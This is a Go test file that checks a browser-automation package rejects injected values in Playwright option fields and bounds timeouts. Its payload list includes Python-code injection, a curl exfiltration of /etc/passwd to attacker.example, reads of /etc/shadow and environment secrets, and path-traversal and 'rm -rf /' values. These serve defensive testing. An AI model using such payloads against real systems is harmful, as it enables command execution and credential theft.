package browser

import (
	"strings"
	"testing"
)

// injectionPayloads are values crafted to close the surrounding Python string
// literal and append statements. Each option field below is interpolated into a
// generated script, so every one of these has to be refused rather than escaped
// — the fields are Playwright enums and have no legitimate free-form value.
var injectionPayloads = []string{
	`load'); import os; os.system('id'); page.goto('http://x`,
	`png'); __import__('subprocess').run(['sh','-c','curl attacker.example/$(cat /etc/passwd)']); ('`,
	`A4'); open('/proc/self/environ').read(); ('`,
	`load' + open('/etc/shadow').read() + '`,
	"load\nimport os\nos.system('id')",
	"load\\'); print('pwned",
	`load"); print("pwned`,
	"load\x00",
	`load\`,
	`' or 1==1 or '`,
	`{{7*7}}`,
	`$(id)`,
	"load`id`",
	strings.Repeat("a", 5000),
}

// TestWaitUntilRejectsInjection covers Navigate's wait_until, which reached the
// generated script unescaped.
func TestWaitUntilRejectsInjection(t *testing.T) {
	for _, payload := range injectionPayloads {
		if got, err := ValidateWaitUntil(payload); err == nil {
			t.Errorf("ValidateWaitUntil(%q) accepted the value as %q", payload, got)
		}
	}
}

// TestImageFormatRejectsInjection covers the screenshot format, which is
// interpolated both into the script and into the temp file name.
func TestImageFormatRejectsInjection(t *testing.T) {
	for _, payload := range injectionPayloads {
		if got, err := ValidateImageFormat(payload); err == nil {
			t.Errorf("ValidateImageFormat(%q) accepted the value as %q", payload, got)
		}
	}

	// Path traversal through the format would relocate the temp file the host
	// later copies out.
	for _, payload := range []string{"../../etc/passwd", "png/../../../root/.ssh/id_rsa", "png;rm -rf /"} {
		if _, err := ValidateImageFormat(payload); err == nil {
			t.Errorf("ValidateImageFormat(%q) accepted a path-shaped format", payload)
		}
	}
}

// TestPaperFormatRejectsInjection covers the PDF paper size.
func TestPaperFormatRejectsInjection(t *testing.T) {
	for _, payload := range injectionPayloads {
		if got, err := ValidatePaperFormat(payload); err == nil {
			t.Errorf("ValidatePaperFormat(%q) accepted the value as %q", payload, got)
		}
	}
}

// TestOptionValidatorsAcceptRealValues guards against over-tightening: every
// value the Playwright API documents must still work, and an empty value must
// fall back to the documented default.
func TestOptionValidatorsAcceptRealValues(t *testing.T) {
	for _, v := range validWaitUntil {
		if got, err := ValidateWaitUntil(v); err != nil || got != v {
			t.Errorf("ValidateWaitUntil(%q) = %q, %v; want the value unchanged", v, got, err)
		}
	}
	for _, v := range validImageFormats {
		if got, err := ValidateImageFormat(v); err != nil || got != v {
			t.Errorf("ValidateImageFormat(%q) = %q, %v; want the value unchanged", v, got, err)
		}
	}
	for _, v := range validPaperFormats {
		if got, err := ValidatePaperFormat(v); err != nil || got != v {
			t.Errorf("ValidatePaperFormat(%q) = %q, %v; want the value unchanged", v, got, err)
		}
	}

	if got, err := ValidateWaitUntil(""); err != nil || got != "load" {
		t.Errorf("empty wait_until = %q, %v; want the default \"load\"", got, err)
	}
	if got, err := ValidateImageFormat(""); err != nil || got != "png" {
		t.Errorf("empty format = %q, %v; want the default \"png\"", got, err)
	}
	if got, err := ValidatePaperFormat(""); err != nil || got != "A4" {
		t.Errorf("empty paper format = %q, %v; want the default \"A4\"", got, err)
	}
}

// TestOptionValidatorsAreCaseSensitive documents that a differently-cased value
// is refused rather than silently normalised: Playwright's enums are
// case-sensitive, so accepting "PNG" here would produce a script that fails
// inside the container with a confusing error.
func TestOptionValidatorsAreCaseSensitive(t *testing.T) {
	for _, v := range []string{"LOAD", "Load", "NetworkIdle"} {
		if _, err := ValidateWaitUntil(v); err == nil {
			t.Errorf("ValidateWaitUntil(%q) accepted a differently-cased enum", v)
		}
	}
	if _, err := ValidateImageFormat("PNG"); err == nil {
		t.Error(`ValidateImageFormat("PNG") accepted a differently-cased enum`)
	}
	if _, err := ValidatePaperFormat("a4"); err == nil {
		t.Error(`ValidatePaperFormat("a4") accepted a differently-cased enum`)
	}
}

// TestClampTimeoutBoundsBlockingTime asserts a caller cannot ask for an
// unbounded wait. Playwright reads 0 as "no timeout", which would hold a
// container and an API goroutine open indefinitely.
func TestClampTimeoutBoundsBlockingTime(t *testing.T) {
	cases := []struct {
		in, want int
	}{
		{0, 30000},
		{-1, 30000},
		{-1 << 40, 30000},
		{1, 1},
		{30000, 30000},
		{MaxBrowserTimeoutMs, MaxBrowserTimeoutMs},
		{MaxBrowserTimeoutMs + 1, MaxBrowserTimeoutMs},
		{1 << 40, MaxBrowserTimeoutMs},
	}

	for _, tc := range cases {
		if got := ClampTimeout(tc.in); got != tc.want {
			t.Errorf("ClampTimeout(%d) = %d, want %d", tc.in, got, tc.want)
		}
	}
}
